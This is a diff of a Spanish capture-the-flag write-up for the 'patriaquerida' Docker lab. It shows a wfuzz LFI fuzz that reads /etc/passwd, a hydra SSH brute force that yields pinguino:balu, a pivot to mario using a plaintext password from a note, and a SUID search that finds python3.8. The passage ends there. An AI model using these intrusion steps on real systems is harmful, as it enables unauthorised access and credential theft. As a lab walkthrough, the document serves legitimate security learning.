@@ -4,6 +4,7 @@ Levantamos el docker:
 sudo bash auto_deploy.sh patriaquerida.tar 
 ```
 y nos levanta la maquina víctima con la IP:172.17.0.2
+##fase de enumeración
 
 Lo primero es hacer un escaneo de puertos y servicios que corren en la maquina y lo exportamos a un archivo en formato 
 nmap que se va a llamar PuertosYservicios:
@@ -100,6 +101,7 @@ http://172.17.0.2/icons/ubuntu-logo.png
 http://172.17.0.2/index.php
 http://172.17.0.2/index.html
 ```
+##fase de intrusión
 tres rutas, vamos a comprobarlas, empezamos por http://172.17.0.2/index.php:
 y vemos que nos pone esto:
 ```
@@ -114,4 +116,148 @@ y vemos esto:
 balu
 ```
 
-y hasta aquí he llegado, lo que tiene tener una niña ;) intentaré seguir mañana
+tenemos un pass pero nos falta un user, probé a realizar fuerza bruta sin éxito, asi pues me centré en el php.
+Un posible LFI?, así que realice un fuzz:
+```bash
+ wfuzz -c --hc=404 --hh=109 -w /usr/share/wordlists/dirb/big.txt  'http://172.17.0.2/index.php?FUZZ=/etc/passwd'
+```
+```
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://172.17.0.2/index.php?FUZZ=/etc/passwd
+Total requests: 20469
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
+=====================================================================
+
+000013354:   200        26 L     36 W       1367 Ch     "page"
+```
+bueno parece ser que por ahí van los tiros
+```bash
+http://172.17.0.2/index.php?page=/etc/passwd
+```
+inserto eso en el buscador y tengo acceso al /etc/passwd (lo leo en el codigo fuente que está mas ordenadito)
+```bash
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+pinguino:x:1000:1000::/home/pinguino:/bin/bash
+mario:x:1001:1001::/home/mario:/bin/bash
+```
+me hago un diccionario con los user, quedandome así:
+```
+root
+www-data
+gnats
+messagebus
+pinguino
+mario
+```
+y hago fuerzabruta con este diccionario y el pass balu
+```bash
+hydra -L user.txt  -p balu -t 16 -V -f -I ssh://172.17.0.2
+```
+*explicación:*
+-L: mayúsculas para indicar que usamos un diccionario en este caso user.txt que esta en el directorio donde trabajo
+-p: minúscula para indicar que usamos como pass esa palabra y no un diccionario
+-t 16: hilos, tareas en paralelo 16 peticiones
+-V: modo verbose para ver por pantalla lo que está haciendo
+-f: detiene el ataque cuando encuentra una combinación valida
+-I: para desactivar el tiempo de espera inicial (creo recordar que dos segundos)
+
+```[ATTEMPT] target 172.17.0.2 - login "root" - pass "balu" - 1 of 6 [child 0] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "www-data" - pass "balu" - 2 of 6 [child 1] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "gnats" - pass "balu" - 3 of 6 [child 2] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "messagebus" - pass "balu" - 4 of 6 [child 3] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "pinguino" - pass "balu" - 5 of 6 [child 4] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "mario" - pass "balu" - 6 of 6 [child 5] (0/0)
+[22][ssh] host: 172.17.0.2   login: pinguino   password: balu
+[STATUS] attack finished for 172.17.0.2 (valid pair found)
+```
+pues ya tenemos user y pass para ssh pinguino:balu
+##fase escalada
+entramos desde ssh:
+```bash
+ssh pinguino@172.17.0.2
+´´´
+con el pass "balu", ya estamos dentro.
+
+Miramos que hay en nuestro home
+```bash
+ls -la
+```
+```
+drwxr-xr-x 1 pinguino pinguino 4096 Jan 16 16:28 .
+drwxr-xr-x 1 root     root     4096 Jan 12 22:38 ..
+-rw-r--r-- 1 pinguino pinguino  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 pinguino pinguino 3771 Feb 25  2020 .bashrc
+drwx------ 2 pinguino pinguino 4096 Jan 16 16:28 .cache
+-rw-r--r-- 1 pinguino pinguino  807 Feb 25  2020 .profile
+-rw------- 1 pinguino pinguino   43 Jan 12 22:38 nota_mario.txt
+```
+abrimos nota_mario.txt
+```bash
+cat nota_mario.txt
+```
+```
+La contraseña de mario es: invitaacachopo
+```
+parece que tenemos la contraseña del usuario Mario, si miramos el passwd
+```bash
+cat /etc/passwd | grep sh$
+```
+```
+root:x:0:0:root:/root:/bin/bash
+pinguino:x:1000:1000::/home/pinguino:/bin/bash
+mario:x:1001:1001::/home/mario:/bin/bash
+```
+aparte de pinguino que tengan shell (de ahi el  | grep sh$ de arriba) solo está mario y root
+##pivotamos a usuario mario
+```bash
+su mario
+```
+e introducimos la contraseña del usuario que habíamos encontrado (invitaacachopo)
+siendo ya mariorevisando todo un poco al final miro si tenemos permisos suid
+```bash
+find / -perm -4000 2>/dev/null
+```
+```
+/usr/bin/chfn
+/usr/bin/man
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/python3.8
+/usr/bin/sudo
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+entre ellos vemos python
